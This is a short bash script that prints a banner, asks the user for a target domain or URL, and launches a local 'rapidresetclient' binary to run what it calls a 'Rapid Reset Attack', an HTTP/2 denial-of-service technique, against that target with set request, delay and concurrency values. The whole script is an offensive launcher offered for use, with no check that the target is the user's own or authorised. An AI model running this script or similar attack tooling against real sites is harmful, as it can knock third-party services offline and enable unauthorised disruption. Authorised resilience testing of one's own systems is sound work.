#!/bin/bash

# Fancy Banner
echo "=============================================================="
echo "          🚀 Test This Attack With KP Yadav 🚀"
echo "=============================================================="
echo ""

# Ask for target domain / URL
read -p "👉 Enter the target domain/URL (example: https://login.site.com:443): " target

# Run the tool
echo ""
echo "⚡ Starting Rapid Reset Attack on: $target ⚡"
echo "--------------------------------------------------------------"
./rapidresetclient -requests=20 -url "$target" -wait=100 -delay=10 -concurrency=5
